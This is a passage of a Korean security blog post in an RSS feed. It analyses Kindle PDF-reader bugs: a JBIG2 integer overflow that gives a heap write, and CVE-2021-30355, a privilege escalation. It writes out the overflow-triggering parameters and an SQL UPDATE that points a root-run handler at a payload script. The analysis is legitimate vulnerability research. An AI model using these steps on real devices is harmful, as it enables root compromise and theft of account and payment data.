&#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; &#xC218;&#xC815;&#xD558;&#xBA74; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC758; PDF &#xD30C;&#xC2F1; &#xD568;&#xC218;&#xC778; <code>Jbig2Module::StartDecode</code> &#xBA54;&#xC11C;&#xB4DC;&#xAC00; JBIG2Globals &#xC2A4;&#xD2B8;&#xB9BC;&#xC744; &#xB514;&#xCF54;&#xB529;&#xD560; &#xB54C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/24/l0ch/2021-08-24/1.png" alt></p><h3 id="&#xC774;&#xBBF8;&#xC9C0;-&#xC815;&#xBCF4;-&#xC601;&#xC5ED;-&#xCCAB;-0x23-bytes"><a href="#&#xC774;&#xBBF8;&#xC9C0;-&#xC815;&#xBCF4;-&#xC601;&#xC5ED;-&#xCCAB;-0x23-bytes" class="headerlink" title="&#xC774;&#xBBF8;&#xC9C0; &#xC815;&#xBCF4; &#xC601;&#xC5ED;(&#xCCAB; 0x23 bytes)"></a>&#xC774;&#xBBF8;&#xC9C0; &#xC815;&#xBCF4; &#xC601;&#xC5ED;(&#xCCAB; 0x23 bytes)</h3><p>&#xC774;&#xBBF8;&#xC9C0;&#xC758; <code>width = 0x80</code>, <code>height = 0x1</code>, <code>stride = 0x10</code>&#xC785;&#xB2C8;&#xB2E4;. <code>stride</code> &#xAC12;&#xC740; <code>((width + 0x1F) &gt;&gt; 5) &lt;&lt; 2</code>&#xB85C; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="refinement-&#xC601;&#xC5ED;-0x23-0x4D-bytes"><a href="#refinement-&#xC601;&#xC5ED;-0x23-0x4D-bytes" class="headerlink" title="refinement &#xC601;&#xC5ED;(0x23 ~ 0x4D bytes)"></a>refinement &#xC601;&#xC5ED;(0x23 ~ 0x4D bytes)</h3><p>&#xC774; &#xC601;&#xC5ED;&#xC5D0;&#xB294; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xB2E4;&#xB4EC;&#xAE30; &#xC704;&#xD574; jbig2&#xB85C; &#xC778;&#xCF54;&#xB529; &#xB41C; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xC77C;&#xBD80;&#xB9CC; &#xB2E4;&#xB4EC;&#xC744; &#xC218; &#xC788;&#xC5B4; &#xC77C;&#xBD80; &#xC0AC;&#xAC01;&#xD615; &#xBC94;&#xC704;&#xC758; &#xC88C;&#xD45C;&#xAC00; &#xC8FC;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC704; &#xC0AC;&#xC9C4;&#xC758; &#xACBD;&#xC6B0; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. <code>width &#x2013; 0</code>, <code>height &#x2013; 0x10</code>, <code>x &#x2013; 0</code>, <code>y &#x2013; 0x4000000</code></p><p>&#xC774;&#xB54C; &#xC774;&#xBBF8;&#xC9C0;&#xBCF4;&#xB2E4; &#xD070; refinement &#xC601;&#xC5ED;&#xC774; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xB514;&#xCF54;&#xB529; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xC0C8; &#xCC28;&#xC6D0;&#xC73C;&#xB85C; &#xD655;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C8; &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xB192;&#xC774;&#xB294; <code>height + y</code>&#xC640; <code>(height + y) * stride</code> &#xB85C; &#xB2E4;&#xC2DC; &#xACC4;&#xC0B0;&#xB418;&#xACE0; &#xD574;&#xB2F9; &#xD06C;&#xAE30;&#xC758; &#xC774;&#xBBF8;&#xC9C0;&#xC5D0; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC0C8; &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xD06C;&#xAE30;&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xB54C; <code>INT_MAX</code>&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xAC00; &#xC5C6;&#xC5B4; 32bit &#xB808;&#xC9C0;&#xC2A4;&#xD130; Integer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; <code>0x400000100</code> &#xB300;&#xC2E0; <code>0x100</code> bytes&#xAC00; &#xC774;&#xBBF8;&#xC9C0;&#xC5D0; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xD06C;&#xAE30;&#xC758; refinement &#xC601;&#xC5ED;&#xC744; &#xC0DD;&#xC131;&#xD574; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC81C;&#xC5B4;&#xD558;&#xACE0; arbitrary write primitive&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2021-30355"><a href="#CVE-2021-30355" class="headerlink" title="CVE-2021-30355"></a>CVE-2021-30355</h2><p>pdfreader &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; Java &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xAD8C;&#xD55C;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xC720;&#xC800;&#xB294; &#xB2E4;&#xC74C; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; <code>/var/tmp/framework</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC804;&#xCCB4; &#xC561;&#xC138;&#xC2A4;</li><li>&#xAE30;&#xBCF8; &#xC571; &#xC2E4;&#xD589; &#xC815;&#xBCF4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>/var/local/appreg.db</code> sqlite &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xC561;&#xC138;&#xC2A4;</li></ul><p><code>appreg.db</code>&#xC758; &#xAE30;&#xBCF8; &#xC571; &#xC2E4;&#xD589; &#xC2DC; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBA85;&#xB839;&#xC5B4; &#xD56D;&#xBAA9;&#xC778; <code>properties</code> &#xD14C;&#xC774;&#xBE14;&#xC758; <code>command</code> &#xD56D;&#xBAA9;&#xC744; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC218;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> properties <span class="hljs-keyword">SET</span> <span class="hljs-keyword">value</span>=<span class="hljs-string">&apos;var/tmp/framework/payload.sh&apos;</span> <span class="hljs-keyword">WHERE</span> handlerId = <span class="hljs-string">&apos;com.lab126.browser&apos;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">name</span> =<span class="hljs-string">&apos;command&apos;</span>;/usr/bin/mesquite &#x2192; /var/tmp/framework/payload.sh</code></pre><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xC218;&#xC815; &#xD6C4; pdfreader&#xC5D0;&#xC11C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB97C; &#xC5F4;&#xB3C4;&#xB85D; &#xD558;&#xBA74; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xAD00;&#xB9AC;&#xC790;&#xB294; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xAE30;&#xBCF8; &#xC571; <code>com.lab126.browser</code> &#xD56D;&#xBAA9;&#xC744; &#xC77D;&#xACE0; &#xC218;&#xC815;&#xB41C; <code>command</code>&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xD3EC;&#xD568;&#xB41C; <code>/var/tmp/framework/payload.sh</code> &#xC744; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD574; CVE-2021-30354&#xC758; &#xC720;&#xC800; &#xD504;&#xB85C;&#xC138;&#xC2A4; RCE &#xAD8C;&#xD55C;&#xC744; root&#xB85C; &#xC0C1;&#xC2B9;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xB450; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; Kindle &#xC571;&#xC5D0;&#xC11C; &#xC545;&#xC131; PDF &#xBB38;&#xC11C;&#xB97C; &#xC5F4;&#xC5B4;&#xBCF4;&#xAE30;&#xB9CC; &#xD574;&#xB3C4; &#xAE30;&#xAE30;&#xC758; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xAE30;&#xAE30; &#xC815;&#xBCF4; &#xBC0F; Amazon &#xACC4;&#xC815;, &#xACB0;&#xC81C; &#xD06C;&#xB9AC;&#xB374;&#xC15C;&#xC744; &#xD0C8;&#xCDE8;&#xD560;  &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/24/l0ch/2021-08-24/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
